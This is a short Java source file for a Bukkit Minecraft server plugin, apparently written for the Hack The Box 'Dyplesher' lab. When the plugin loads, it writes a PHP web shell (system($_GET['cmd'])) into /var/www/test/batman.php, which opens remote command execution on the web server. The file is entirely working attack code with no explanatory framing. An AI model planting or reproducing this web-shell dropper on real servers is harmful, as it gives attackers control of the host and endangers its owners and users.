package htb.dyplesher.plugin;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;  // Import the File class
import java.io.FileWriter;  // Import the FileWriter class
import java.io.IOException;  // Import the IOException class to handle errors

public class CreateFile extends JavaPlugin {
    @Override
    public void onEnable() {
    try {
      File myObj = new File("/var/www/test/batman.php");
      if (myObj.createNewFile()) {
        System.out.println("File created: " + myObj.getName());
	FileWriter fr = new FileWriter(myObj, true);
	fr.write("<?php system($_GET['cmd']); ?>");
	fr.close();
      } else {
        System.out.println("File already exists.");
      }
    } catch (IOException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();
    }

    }
}
